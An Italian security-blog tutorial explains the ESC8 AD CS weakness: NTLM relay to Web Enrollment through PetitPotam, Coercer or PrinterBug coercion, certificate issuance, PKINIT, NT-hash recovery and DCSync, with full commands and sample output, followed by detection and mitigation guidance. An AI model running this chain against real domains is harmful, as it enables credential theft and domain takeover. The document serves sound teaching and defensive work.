---
title: 'ESC8 AD CS: PrivEsc, Attacco NTLM Relay con Certipy e PKINIT'
slug: esc8-adcs
description: 'ESC8 privilege escalation, sfrutta NTLM Relay contro gli endpoint /certsrv/ AD CS per ottenere certificati privilegiati. Guida con Certipy e coercion NTLM.'
image: /8.webp
draft: false
date: 2026-03-08T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC8
  - AD CS Web Enrollment
  - NTLM Relay
  - PetitPotam
  - Certipy
---

# ESC8 AD CS: NTLM Relay contro gli Endpoint Web Enrollment

ESC8 non è una falla in un template o in un'ACL, ma una condizione di rete: un endpoint web di AD CS (tipicamente `/certsrv/`) accetta autenticazione NTLM senza protezioni contro il relay. Se un attaccante riesce a far autenticare un account privilegiato — spesso un Domain Controller — verso un host sotto il suo controllo, può rilanciare quell'autenticazione alla CA e farsi emettere un certificato a nome della vittima. Da lì, in teoria, si arriva a un TGT Kerberos e all'NT hash dell'account.

Il punto delicato è che questa è una catena di più passaggi indipendenti — coercion, relay, emissione del certificato, mapping forte, autenticazione PKINIT — e ognuno può fallire senza che i precedenti lo facciano. Il resto dell'articolo segue proprio questa logica: prima la condizione ESC8 vista con Certipy, poi i due metodi di relay, poi la verifica che il certificato ottenuto sia davvero utilizzabile per autenticarsi.

| Termine                        | Significato                                                                                                                                                      |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **AD CS**                      | Active Directory Certificate Services, il servizio Windows che emette certificati digitali nel dominio                                                           |
| **ESC8**                       | Nome convenzionale (SpecterOps) della configurazione in cui un endpoint web di enrollment della CA accetta NTLM senza protezioni anti-relay                      |
| **NTLM Relay**                 | Tecnica che intercetta un tentativo di autenticazione NTLM e lo "rilancia" (relay) verso un altro servizio, impersonando la vittima senza conoscerne la password |
| **Coercion**                   | Tecnica che forza una macchina (spesso un Domain Controller) ad autenticarsi verso un host scelto dall'attaccante, tipicamente via SMB                           |
| **PetitPotam**                 | Tool/tecnica di coercion basata su MS-EFSRPC (CVE-2021-36942 per la variante unauthenticated)                                                                    |
| **Web Enrollment**             | L'interfaccia web classica della CA, raggiungibile su `/certsrv/`, usata per richiedere certificati via browser                                                  |
| **CES**                        | Certificate Enrollment Web Service: servizio HTTPS (MS-WSTEP) che riceve le richieste di certificato e le passa alla CA via DCOM                                 |
| **CEP**                        | Certificate Enrollment Policy Web Service: servizio HTTPS (MS-XCEP) che dice al client quali template/CA può usare — **non emette certificati**                  |
| **EPA**                        | Extended Protection for Authentication, meccanismo di channel binding che lega l'autenticazione NTLM al canale TLS, impedendo il relay                           |
| **Channel Binding**            | Il meccanismo tecnico su cui si basa EPA                                                                                                                         |
| **PFX/PKCS#12**                | Formato file che contiene certificato + chiave privata                                                                                                           |
| **PKINIT**                     | Estensione Kerberos che permette l'autenticazione (ottenimento del TGT) tramite certificato invece che password                                                  |
| **Strong Certificate Mapping** | Requisito Microsoft (KB5014754) per cui il KDC deve poter legare in modo "forte" un certificato a un account, tramite SID Security Extension o mapping manuale   |
| **SID Security Extension**     | Estensione nel certificato (OID `1.3.6.1.4.1.311.25.2`) che contiene il SID dell'account, usata dal KDC per il mapping forte                                     |

***

ESC8 è la condizione in cui un endpoint HTTP(S) di enrollment di AD CS accetta autenticazione NTLM senza protezioni contro il relay. Da sola, questa condizione **non è un attacco**: diventa exploitabile solo in combinazione con una coercion che costringe un account privilegiato (tipicamente un Domain Controller) ad autenticarsi verso l'host dell'attaccante.

È fondamentale distinguere questi passaggi, perché ognuno può fallire indipendentemente dagli altri:

1. **Condizione ESC8** — l'endpoint è esposto e privo di EPA.
2. **Coercion** — la vittima viene indotta ad autenticarsi verso l'attaccante.
3. **Relay ed emissione** — l'autenticazione intercettata viene rilanciata alla CA, che emette un certificato.
4. **Autenticazione col certificato** — il KDC accetta il certificato e lo mappa correttamente all'account (dipende dallo strong certificate mapping).
5. **Impatto finale** — dipende dai privilegi reali dell'identità ottenuta.

***

## Web Enrollment, CES e CEP: non sono la stessa cosa

Microsoft elenca **Certificate Authority Web Enrollment** e **Certificate Enrollment Web Service (CES)** come i due servizi esposti al relay NTLM (KB5005413). CEP è un servizio diverso e non va trattato come un target equivalente:

| Servizio           | Endpoint                   | Protocollo                           | Cosa fa                                                        | Supportato dal relay di Certipy                                                  |
| ------------------ | -------------------------- | ------------------------------------ | -------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| **Web Enrollment** | `/certsrv/certfnsh.asp`    | HTTP/HTTPS, NTLM                     | Riceve la richiesta e restituisce il certificato               | Sì — è l'unico target di `certipy relay`                                         |
| **CES**            | endpoint MS-WSTEP dedicato | HTTPS, vari schemi auth inclusa NTLM | Riceve la richiesta via WS-Trust e la passa alla CA via DCOM   | No, non da Certipy; serve `ntlmrelayx` con supporto specifico o verifica manuale |
| **CEP**            | endpoint MS-XCEP dedicato  | HTTPS                                | Fornisce solo la *policy* (quali template/CA sono disponibili) | Non applicabile: CEP non emette certificati                                      |

In pratica: quando questo articolo parla di "relay contro ESC8", si parla sempre del Web Enrollment classico. CES è una superficie di attacco separata, reale ma distinta, da valutare e mitigare a parte; CEP non è un target per ottenere un certificato.

***

# Identificazione con Certipy

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico (HTTPS attivo, EPA disabilitato):

```
Certificate Authorities

CA Name : CORP-CA
DNS Name : CA.CORP.LOCAL

Web Enrollment
  HTTP
    Enabled : False
  HTTPS
    Enabled : True
    Channel Binding (EPA) : False

[!] Vulnerabilities
  ESC8 : Web Enrollment is enabled over HTTPS and Channel Binding is disabled
```

Come leggere questi campi:

* **HTTP Enabled : True** — il servizio è raggiungibile in chiaro, nessuna protezione possibile: relay sempre fattibile se NTLM è accettato.
* **HTTPS Enabled : True** + **Channel Binding (EPA) : False** — il traffico è cifrato, ma TLS da solo **non impedisce il relay**: senza EPA il canale cifrato non è legato all'autenticazione NTLM, quindi la richiesta intercettata può comunque essere rilanciata su un canale TLS diverso.
* **Channel Binding (EPA) : True** — il relay verso questo specifico endpoint è bloccato, indipendentemente da HTTP/HTTPS.

Importante: questo output è un **indicatore di configurazione vulnerabile**, non la prova che un attacco sia andato a buon fine. Dice che il relay è *tecnicamente possibile* verso quell'endpoint, non che la coercion riuscirà o che il certificato risultante sarà accettato dal KDC.

Nell'esempio sopra il risultato mostra `HTTPS Enabled`, quindi — correttamente — il target dei comandi di relay più sotto deve essere `https://`, non `http://`. Lo schema dell'URL usato nel comando `certipy relay`/`ntlmrelayx` deve sempre corrispondere a quanto riportato da `certipy find` per quella CA: puntare a `http://` quando solo HTTPS è abilitato semplicemente non funziona.

***

# Prerequisiti di coercion e relay

Prima di avviare qualsiasi relay, vanno verificate alcune condizioni che l'attacco **non garantisce automaticamente**:

* **Coercion autenticata vs non autenticata.** La variante *unauthenticated* di PetitPotam (CVE-2021-36942, basata su `EfsRpcOpenFileRaw`) è stata patchata da Microsoft. Le varianti rimaste funzionanti richiedono un'autenticazione RPC, quindi un account di dominio (anche a basso privilegio) per instaurare la sessione verso l'interfaccia MS-EFSRPC. Questo non significa però che *ogni* account possa coercere *ogni* host: il risultato dipende dal metodo usato (PetitPotam, PrinterBug/MS-RPRN, i vari metodi di Coercer), dalle patch installate sul target, dalla raggiungibilità della porta/named pipe RPC coinvolta e da eventuali filtri RPC o restrizioni di rete applicati.
* **L'eccezione attesa non è la prova dell'attacco.** L'output `Got expected ERROR_BAD_NETPATH exception!! / Attack worked!` di PetitPotam indica solo che la chiamata RPC ha prodotto la risposta prevista dallo strumento — cioè che il target ha tentato di autenticarsi verso l'host indicato. Non dimostra che il listener di relay abbia effettivamente intercettato quell'autenticazione né che la CA abbia emesso un certificato: per quello serve guardare l'output del relay stesso.
* **Listener attivo prima della coercion.** Il relay (Certipy o ntlmrelayx) deve essere in ascolto prima di lanciare la coercion, altrimenti l'autenticazione non viene intercettata.

***

# Metodo 1 — Certipy relay + PetitPotam

### Terminale 1 — Relay con Certipy

Lo schema dell'URL deve riflettere l'enumerazione (`https://` se è HTTPS il protocollo vulnerabile, come nell'esempio sopra):

```bash
certipy relay -target 'https://10.0.0.50' -template 'DomainController'
```

`-template 'DomainController'` è corretto quando si intende relayare l'autenticazione di un account macchina Domain Controller (i DC hanno di norma diritti di enrollment su quel template). Per relayare un utente generico:

```bash
certipy relay -target 'https://10.0.0.50'
```

In questo caso Certipy seleziona un template adatto in base al tipo di account (utente o macchina) relayato; va comunque verificato che il template sia effettivamente pubblicato e che l'account relayato abbia diritti di enrollment su di esso — non è un'assunzione automatica.

Output:

```
Targeting https://10.0.0.50/certsrv/certfnsh.asp (ESC8)
Listening on 0.0.0.0:445
Setting up SMB Server on port 445
```

Se compare un errore di permesso sulla porta 445 su Linux, la causa è che il bind su porte \< 1024 richiede privilegi. **Non modificare `ip_unprivileged_port_start` a 0 come soluzione di routine**: quel parametro del kernel toglie la protezione a *tutte* le porte privilegiate nel network namespace corrente, non solo alla 445, esponendo potenzialmente altri servizi locali a bind non privilegiati. Alternative più scoped:

* eseguire lo strumento di relay con `sudo` (o con `CAP_NET_BIND_SERVICE` via `setcap`) invece di abbassare il limite globale;
* se si usa comunque `ip_unprivileged_port_start`, farlo solo in un laboratorio isolato/VM dedicata, sapendo che è una modifica runtime del namespace che riguarda ogni processo su quella macchina, non solo il tool di relay.

### Terminale 2 — Coercion con PetitPotam (autenticata)

```bash
python3 PetitPotam.py \
  -d corp.local \
  -u 'hope.sharp' \
  -p 'IsolationIsKey?' \
  <ATTACKER_IP> \
  <DC_IP>
```

Output atteso (indica che la richiesta RPC è stata inviata, non che il relay sia riuscito):

```
[+] Connected!
[+] Successfully bound!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Se il relay ha effettivamente intercettato l'autenticazione, nel Terminale 1 Certipy mostra:

```
Requesting certificate for 'CORP\DC$' based on the template 'DomainController'
Certificate issued with request ID 1
Got certificate with DNS Host Name 'DC.CORP.LOCAL'
Saving certificate and private key to 'dc.pfx'
```

A questo punto l'unico fatto accertato è: **la CA ha emesso un certificato per quell'identità relayata**. Se l'autenticazione non riesce a instaurarsi correttamente (NTLM negoziato male, nessun diritto di enrollment sul template, EPA attivo su un endpoint diverso da quello enumerato), il Terminale 1 semplicemente non produce questo output — e in quel caso bisogna tornare a verificare i prerequisiti sopra, non ripetere ciecamente la coercion.

***

# Metodo 2 — ntlmrelayx + coercion

### Terminale 1 — ntlmrelayx

```bash
ntlmrelayx.py \
  -t https://10.0.0.50/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

Per relayare un utente:

```bash
ntlmrelayx.py \
  -t https://10.0.0.50/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template User
```

Opzioni rilevanti (da codice/documentazione Impacket):

* `--adcs` — attiva l'attacco di relay specifico per AD CS.
* `--template` — se omesso, Impacket seleziona `Machine` o `User` in base al fatto che l'account relayato termini con `$`; per un DC va specificato esplicitamente `DomainController`.
* `--altsid SID` — inserisce un SID nell'estensione `szOID_NTDS_CA_SECURITY_EXT` del certificato. Diventa necessario quando il DC target applica `StrongCertificateBindingEnforcement` a livello 1 o superiore (comportamento di default sui DC aggiornati dal 2025), perché senza questa estensione il KDC può rifiutare il certificato invece di ricadere su un mapping debole. Va usato solo quando serve — se il template/CA già include la Security Extension nel certificato emesso, aggiungerla via `--altsid` è ridondante, e il SID indicato deve corrispondere esattamente all'identità relayata (va recuperato, ad esempio, con `lookupsid.py`).

L'output del relay riuscito è un file **PKCS#12 (PFX)** contenente certificato e chiave privata; quando lo strumento non può scriverlo su disco, ne stampa il contenuto codificato in **base64** — è il PFX codificato, non un "certificato" generico in altro formato.

### Terminale 2 — Coercion

Con PetitPotam autenticato:

```bash
python3 PetitPotam.py -d corp.local -u 'user' -p 'password' <ATTACKER_IP> <DC_IP>
```

Con Coercer (aggrega più metodi di coercion, con prerequisiti non identici tra loro):

```bash
coercer coerce \
  -l <ATTACKER_IP> \
  -t <DC_IP> \
  -d corp.local \
  -u 'user' \
  -p 'password' \
  --always-continue
```

Con PrinterBug (MS-RPRN):

```bash
python3 printerbug.py corp.local/'user':'password'@<DC_IP> <ATTACKER_IP>
```

***

# Validazione del certificato e dell'autenticazione

L'emissione del certificato e il successo dell'autenticazione Kerberos sono **due esiti indipendenti**. Dal 9 settembre 2025 Microsoft ha completato l'enforcement dei requisiti di *strong certificate mapping* (KB5014754): la chiave di registro `StrongCertificateBindingEnforcement` non è più un meccanismo di rollback supportato per tornare al comportamento di compatibilità. Significa che, nell'ambiente attuale, il KDC valuta seriamente se il certificato ricevuto può essere legato in modo forte all'account — e se non lo è, può rifiutare l'autenticazione invece di accettarla con un mapping debole.

| Verifica                 | Cosa controlla                                                                                    |
| ------------------------ | ------------------------------------------------------------------------------------------------- |
| Emissione                | La CA ha restituito un certificato per quella richiesta (non dice nulla sull'autenticazione)      |
| Identità nel certificato | Subject, SAN, DNS Host Name coerenti con l'account previsto                                       |
| SID / Security Extension | Il certificato contiene `szOID_NTDS_CA_SECURITY_EXT` con il SID corretto, oppure serve `--altsid` |
| PKINIT                   | Il KDC accetta o rifiuta il certificato in base ai requisiti di strong mapping attivi su quel DC  |
| Recupero hash            | Risultato aggiuntivo di `getnthash.py`, non garantito a prescindere dal passo precedente          |
| Accesso privilegiato     | Dipende dai privilegi reali dell'account ottenuto, va verificato separatamente                    |

Con Certipy, il passo di autenticazione è:

```bash
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
```

Output in caso di successo:

```
Got TGT
Saving credential cache to 'dc.ccache'
Got hash for 'dc$@corp.local'
```

Con un PFX ottenuto da ntlmrelayx (base64), prima di procedere va ricostruito il file e **verificato il contenuto** (es. con `openssl pkcs12 -info -in dc.pfx` per controllare subject/SAN) prima di fidarsi che rappresenti l'identità attesa:

```bash
echo -n "<BASE64_PFX>" | base64 -d > dc.pfx
```

Poi, tramite PKINITtools:

```bash
python3 gettgtpkinit.py \
  -dc-ip 10.0.0.100 \
  -cert-pfx dc.pfx \
  corp.local/dc$ dc.ccache
```

Lo script stampa a schermo, oltre alla conferma del TGT salvato in `dc.ccache`, anche la **AS-REP encryption key** generata in quella sessione: è quel valore stampato — non uno fisso o riutilizzabile da altre sessioni — che va passato a `getnthash.py`.

```bash
export KRB5CCNAME=dc.ccache
python3 getnthash.py corp.local/dc$ -key <AS_REP_KEY_STAMPATA_SOPRA>
```

Se questo passo riesce, con l'hash NT si può proseguire con un DCSync:

```bash
secretsdump.py -hashes :<NT_HASH> 'corp.local/dc$@<DC_IP>'
```

Nessuno di questi passaggi è garantito a valle del precedente: un certificato emesso può comunque essere rifiutato da PKINIT se il mapping forte non è soddisfatto, e un'autenticazione riuscita su un account macchina DC porta a un DCSync solo perché quell'account specifico ha i diritti di replica — non è una proprietà automatica di "avere un certificato".

***

# Troubleshooting

| Sintomo                                                                         | Causa possibile                                                                                 | Verifica                                                                                                            |
| ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| La coercion risponde ma il relay non emette nulla                               | Listener non attivo prima della coercion, oppure target coerced non è quello collegato al relay | Verificare ordine di avvio e IP/porta del listener                                                                  |
| `certipy relay`/`ntlmrelayx` restituisce errore di connessione verso l'endpoint | Schema URL (http/https) non coerente con l'enumerazione, oppure EPA attivo su quell'endpoint    | Ri-eseguire `certipy find` e confrontare protocollo e stato EPA                                                     |
| Certificato emesso ma `certipy auth`/PKINIT falliscono                          | Strong certificate mapping non soddisfatto (manca Security Extension)                           | Verificare la presenza dell'estensione nel certificato, eventualmente ripetere il relay con `--altsid` (ntlmrelayx) |
| `getnthash.py` non recupera l'hash                                              | AS-REP key errata/non aggiornata, oppure `KRB5CCNAME` non puntato al ccache corretto            | Ricontrollare l'output di `gettgtpkinit.py` per la key corretta                                                     |
| Porta 445 "permission denied"                                                   | Processo non privilegiato su Linux                                                              | Usare `sudo`/`setcap` invece di azzerare `ip_unprivileged_port_start` globalmente                                   |

***

# Detection ESC8 ADCS

L'auditing a livello di eventi richiede due configurazioni separate e indipendenti: il filtro di auditing sulla CA (Certificate Services) e l'auditing di sicurezza del sistema operativo Windows — abilitare solo uno dei due non garantisce che gli eventi vengano generati.

Eventi rilevanti sulla CA:

* **Event ID 4886** — richiesta di certificato ricevuta.
* **Event ID 4887** — certificato emesso (controllare il campo *Requester*).
* **Event ID 4888** — richiesta di certificato negata.

Da correlare, non da leggere isolatamente:

1. **Log IIS** del sito Web Enrollment — accessi a `certfnsh.asp`, IP sorgente, stato HTTP restituito.
2. **Identità autenticata vs IP sorgente**: durante un relay, IIS vede la connessione provenire dall'host che esegue il relay, mentre l'identità autenticata (nel log CA) è quella della vittima coerced. Un controllo che si limita a confrontare IP e nome account perde questa correlazione — è proprio la discrepanza IP-attaccante/identità-vittima il segnale da cercare.
3. **Request ID** nei log IIS correlato al Request ID negli eventi 4886/4887 sulla CA, per collegare la sessione HTTP alla richiesta di certificato.
4. **Eventi Kerberos successivi** (4768 per richiesta TGT, 4624 per logon Schannel) in cui l'IP di provenienza non corrisponde all'IP reale dell'account macchina/utente che risulta autenticato.
5. **Baseline**: le richieste di certificato legittime arrivano spesso da account macchina e processi automatici; un account macchina DC che richiede un certificato da un IP inatteso è un segnale più forte di una singola richiesta a `certfnsh.asp`.

***

# Mitigation ESC8 ADCS

| Controllo                     | Dettaglio                                                                                                                                                                             |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **EPA**                       | Impostare **Required** (non solo "Allowed") su Web Enrollment e CES dove la compatibilità lo consente — è la protezione che effettivamente blocca il relay, non un'opzione accessoria |
| **HTTPS**                     | Richiedere TLS e disabilitare gli endpoint HTTP non necessari — ma da solo **non basta**: senza EPA il relay resta possibile anche su HTTPS                                           |
| **NTLM**                      | Disabilitare o restringere NTLM sui servizi IIS coinvolti dove la compatibilità lo permette (policy "Network security: Restrict NTLM")                                                |
| **Web Enrollment / CES**      | Se non sono necessari, rimuoverli: è la mitigazione preferita da Microsoft, più efficace di qualunque hardening dell'endpoint                                                         |
| **Coercion**                  | Ridurre la superficie RPC esposta dai DC (filtri RPC su MS-EFSR via `netsh`), applicare le patch per i vettori di coercion noti                                                       |
| **Logging**                   | Attivare auditing CA + Windows Security + log IIS, come descritto nella sezione Detection                                                                                             |
| **Verifica post-remediation** | Ri-eseguire `certipy find` dopo ogni modifica per confermare che EPA risulti effettivamente applicato sull'endpoint, non solo configurato                                             |

***

# FAQ — ESC8 ADCS

### Cos'è ESC8 in AD CS?

È la condizione in cui un endpoint web di enrollment della CA (tipicamente Web Enrollment, `/certsrv/`) accetta autenticazione NTLM senza Extended Protection for Authentication, rendendolo vulnerabile a NTLM relay.

### Perché HTTPS senza EPA può essere vulnerabile?

Perché TLS cifra il trasporto ma non lega di per sé la sessione NTLM al canale TLS. Senza channel binding (EPA), un'autenticazione NTLM intercettata può essere rilanciata su una connessione TLS diversa da quella originale.

### Qual è la differenza tra Web Enrollment, CES e CEP?

Web Enrollment e CES possono entrambi ricevere ed emettere certificati (e sono quindi target di relay); CEP fornisce solo informazioni di policy (quali template/CA sono disponibili) e non emette certificati. Il comando `certipy relay` per ESC8 supporta solo Web Enrollment classico.

### ESC8 richiede un account di dominio per la coercion?

Per i metodi di coercion rimasti funzionanti dopo la patch della variante PetitPotam unauthenticated (CVE-2021-36942), sì — serve un'autenticazione RPC, quindi un account di dominio anche a basso privilegio. Questo non garantisce però che la coercion riesca su un target specifico: dipende da patch, metodo usato e configurazione di rete.

### ESC8 porta sempre a Domain Admin o compromissione del dominio?

No. Se viene relayato un account privilegiato (es. un Domain Controller) e l'intera catena — coercion, relay, emissione, strong certificate mapping, autenticazione PKINIT — va a buon fine, si ottengono TGT e NT hash per quell'identità. Ogni passaggio può fallire indipendentemente, e l'impatto finale dipende dai privilegi reali dell'account ottenuto.

### Perché il certificato emesso può essere rifiutato da PKINIT?

Dal 9 settembre 2025 i Domain Controller aggiornati applicano l'enforcement del *strong certificate mapping* (KB5014754): se il certificato non contiene un mapping forte (tipicamente la SID Security Extension) verso l'account, il KDC può rifiutarlo invece di accettarlo con un fallback debole.

### Qual è la differenza tra ESC8 e ESC6?

[ESC6](https://hackita.it/articoli/esc6-adcs/) è una misconfigurazione della CA che permette di specificare SAN arbitrari nella richiesta di certificato. ESC8 è una condizione di relay NTLM sugli endpoint web della CA: sfrutta il trasporto dell'autenticazione, non il contenuto della richiesta.

***

> ESC8 è una delle condizioni più comuni da verificare in un'infrastruttura AD CS. Per la panoramica completa delle tecniche ESC1–ESC16 leggi la guida: [AD CS Privilege Escalation: Tutte le Tecniche ESC1–ESC16 con Certipy](https://hackita.it/articoli/adcs-esc1-esc16/).Tecniche collegate: [ESC9 ADCS](https://hackita.it/articoli/esc9-adcs/) e [ESC10 AD CS](https://hackita.it/articoli/esc10-adcs/) riguardano l'assenza della SID Security Extension e il weak certificate mapping in Schannel — rilevanti anche qui per capire perché un certificato relayato può non essere accettato. Per l'autenticazione via certificato e PKINIT vedi anche la guida [Kerberos](https://hackita.it/articoli/kerberos/).

**Fonti tecniche:**

* [Certipy — GitHub Wiki, Privilege Escalation (ESC8)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
* [Microsoft — KB5005413: Mitigating NTLM Relay Attacks on AD CS](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
